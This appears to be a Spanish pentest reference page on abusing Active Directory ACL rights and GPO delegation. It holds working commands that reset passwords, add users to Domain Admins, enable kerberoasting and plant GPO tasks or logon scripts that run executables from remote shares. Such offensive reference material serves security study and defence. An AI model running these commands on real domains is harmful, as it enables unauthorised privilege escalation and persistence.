# Abuso de ACLs/ACEs de Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Esta página es principalmente un resumen de las técnicas de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **y** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Para más detalles, consulta los artículos originales.**

## **Derechos GenericAll en Usuario**

Este privilegio otorga a un atacante control total sobre una cuenta de usuario objetivo. Una vez que se confirman los derechos `GenericAll` utilizando el comando `Get-ObjectAcl`, un atacante puede:

- **Cambiar la Contraseña del Objetivo**: Usando `net user <username> <password> /domain`, el atacante puede restablecer la contraseña del usuario.
- **Kerberoasting Dirigido**: Asignar un SPN a la cuenta del usuario para que sea susceptible de kerberoasting, luego usar Rubeus y targetedKerberoast.py para extraer e intentar descifrar los hashes del ticket-granting ticket (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Desactivar la pre-autenticación para el usuario, haciendo que su cuenta sea vulnerable a ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Derechos GenericAll en el Grupo**

Este privilegio permite a un atacante manipular las membresías de grupo si tiene derechos `GenericAll` en un grupo como `Domain Admins`. Después de identificar el nombre distinguido del grupo con `Get-NetGroup`, el atacante puede:

- **Agregarse al Grupo de Administradores de Dominio**: Esto se puede hacer a través de comandos directos o utilizando módulos como Active Directory o PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Tener estos privilegios en un objeto de computadora o una cuenta de usuario permite:

- **Kerberos Resource-based Constrained Delegation**: Permite tomar el control de un objeto de computadora.
- **Shadow Credentials**: Utiliza esta técnica para suplantar una computadora o cuenta de usuario aprovechando los privilegios para crear credenciales en sombra.

## **WriteProperty on Group**

Si un usuario tiene derechos de `WriteProperty` en todos los objetos para un grupo específico (por ejemplo, `Domain Admins`), puede:

- **Add Themselves to the Domain Admins Group**: Alcanzable mediante la combinación de los comandos `net user` y `Add-NetGroupUser`, este método permite la escalación de privilegios dentro del dominio.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Auto (Auto-Membresía) en Grupo**

Este privilegio permite a los atacantes agregarse a grupos específicos, como `Domain Admins`, a través de comandos que manipulan directamente la membresía del grupo. Usar la siguiente secuencia de comandos permite la auto-adición:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Auto-Membresía)**

Un privilegio similar, esto permite a los atacantes agregarse directamente a grupos modificando las propiedades del grupo si tienen el derecho de `WriteProperty` en esos grupos. La confirmación y ejecución de este privilegio se realizan con:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Tener el `ExtendedRight` en un usuario para `User-Force-Change-Password` permite restablecer contraseñas sin conocer la contraseña actual. La verificación de este derecho y su explotación se puede realizar a través de PowerShell o herramientas de línea de comandos alternativas, ofreciendo varios métodos para restablecer la contraseña de un usuario, incluyendo sesiones interactivas y comandos de una sola línea para entornos no interactivos. Los comandos varían desde invocaciones simples de PowerShell hasta el uso de `rpcclient` en Linux, demostrando la versatilidad de los vectores de ataque.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner en el Grupo**

Si un atacante descubre que tiene derechos de `WriteOwner` sobre un grupo, puede cambiar la propiedad del grupo a sí mismo. Esto es particularmente impactante cuando el grupo en cuestión es `Domain Admins`, ya que cambiar la propiedad permite un control más amplio sobre los atributos y la membresía del grupo. El proceso implica identificar el objeto correcto a través de `Get-ObjectAcl` y luego usar `Set-DomainObjectOwner` para modificar el propietario, ya sea por SID o por nombre.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite en Usuario**

Este permiso permite a un atacante modificar las propiedades del usuario. Específicamente, con acceso `GenericWrite`, el atacante puede cambiar la ruta del script de inicio de sesión de un usuario para ejecutar un script malicioso al iniciar sesión el usuario. Esto se logra utilizando el comando `Set-ADObject` para actualizar la propiedad `scriptpath` del usuario objetivo para que apunte al script del atacante.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite en Grupo**

Con este privilegio, los atacantes pueden manipular la membresía de grupos, como agregarse a sí mismos u otros usuarios a grupos específicos. Este proceso implica crear un objeto de credencial, usarlo para agregar o eliminar usuarios de un grupo y verificar los cambios de membresía con comandos de PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Poseer un objeto de AD y tener privilegios de `WriteDACL` sobre él permite a un atacante otorgarse a sí mismo privilegios de `GenericAll` sobre el objeto. Esto se logra a través de la manipulación de ADSI, lo que permite un control total sobre el objeto y la capacidad de modificar sus membresías de grupo. A pesar de esto, existen limitaciones al intentar explotar estos privilegios utilizando los cmdlets `Set-Acl` / `Get-Acl` del módulo de Active Directory.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replicación en el Dominio (DCSync)**

El ataque DCSync aprovecha permisos de replicación específicos en el dominio para imitar un Controlador de Dominio y sincronizar datos, incluyendo credenciales de usuario. Esta poderosa técnica requiere permisos como `DS-Replication-Get-Changes`, permitiendo a los atacantes extraer información sensible del entorno de AD sin acceso directo a un Controlador de Dominio. [**Aprende más sobre el ataque DCSync aquí.**](../dcsync.md)

## Delegación de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegación de GPO

El acceso delegado para gestionar Objetos de Política de Grupo (GPO) puede presentar riesgos de seguridad significativos. Por ejemplo, si un usuario como `offense\spotless` tiene derechos de gestión de GPO delegados, puede tener privilegios como **WriteProperty**, **WriteDacl** y **WriteOwner**. Estos permisos pueden ser abusados para fines maliciosos, como se identifica usando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerar Permisos de GPO

Para identificar GPO mal configurados, se pueden encadenar los cmdlets de PowerSploit. Esto permite descubrir GPOs que un usuario específico tiene permisos para gestionar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computadoras con una Política Dada Aplicada**: Es posible resolver qué computadoras se aplica una GPO específica, ayudando a entender el alcance del impacto potencial. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Políticas Aplicadas a una Computadora Dada**: Para ver qué políticas se aplican a una computadora en particular, se pueden utilizar comandos como `Get-DomainGPO`.

**OUs con una Política Dada Aplicada**: Identificar unidades organizativas (OUs) afectadas por una política dada se puede hacer usando `Get-DomainOU`.

### Abusar de GPO - New-GPOImmediateTask

Los GPO mal configurados pueden ser explotados para ejecutar código, por ejemplo, creando una tarea programada inmediata. Esto se puede hacer para agregar un usuario al grupo de administradores locales en las máquinas afectadas, elevando significativamente los privilegios:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuso de GPO

El módulo GroupPolicy, si está instalado, permite la creación y vinculación de nuevos GPO, y la configuración de preferencias como valores de registro para ejecutar puertas traseras en los computadores afectados. Este método requiere que el GPO sea actualizado y que un usuario inicie sesión en el computador para su ejecución:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuso de GPO

SharpGPOAbuse ofrece un método para abusar de GPOs existentes al agregar tareas o modificar configuraciones sin necesidad de crear nuevos GPOs. Esta herramienta requiere la modificación de GPOs existentes o el uso de herramientas RSAT para crear nuevos antes de aplicar cambios:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forzar Actualización de Políticas

Las actualizaciones de GPO suelen ocurrir aproximadamente cada 90 minutos. Para acelerar este proceso, especialmente después de implementar un cambio, se puede usar el comando `gpupdate /force` en la computadora objetivo para forzar una actualización inmediata de la política. Este comando asegura que cualquier modificación a los GPO se aplique sin esperar el próximo ciclo de actualización automática.

### Detrás de Escena

Al inspeccionar las Tareas Programadas para un GPO dado, como la `Política Mal Configurada`, se puede confirmar la adición de tareas como `evilTask`. Estas tareas se crean a través de scripts o herramientas de línea de comandos con el objetivo de modificar el comportamiento del sistema o escalar privilegios.

La estructura de la tarea, como se muestra en el archivo de configuración XML generado por `New-GPOImmediateTask`, detalla las especificaciones de la tarea programada, incluyendo el comando a ejecutar y sus desencadenadores. Este archivo representa cómo se definen y gestionan las tareas programadas dentro de los GPO, proporcionando un método para ejecutar comandos o scripts arbitrarios como parte de la aplicación de políticas.

### Usuarios y Grupos

Los GPO también permiten la manipulación de membresías de usuarios y grupos en sistemas objetivo. Al editar directamente los archivos de políticas de Usuarios y Grupos, los atacantes pueden agregar usuarios a grupos privilegiados, como el grupo local de `administradores`. Esto es posible a través de la delegación de permisos de gestión de GPO, que permite la modificación de archivos de políticas para incluir nuevos usuarios o cambiar las membresías de grupos.

El archivo de configuración XML para Usuarios y Grupos detalla cómo se implementan estos cambios. Al agregar entradas a este archivo, se pueden otorgar privilegios elevados a usuarios específicos en los sistemas afectados. Este método ofrece un enfoque directo para la escalada de privilegios a través de la manipulación de GPO.

Además, se pueden considerar métodos adicionales para ejecutar código o mantener persistencia, como aprovechar scripts de inicio/cierre de sesión, modificar claves del registro para autorun, instalar software a través de archivos .msi, o editar configuraciones de servicios. Estas técnicas proporcionan diversas vías para mantener el acceso y controlar sistemas objetivo a través del abuso de GPOs.

## Referencias

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
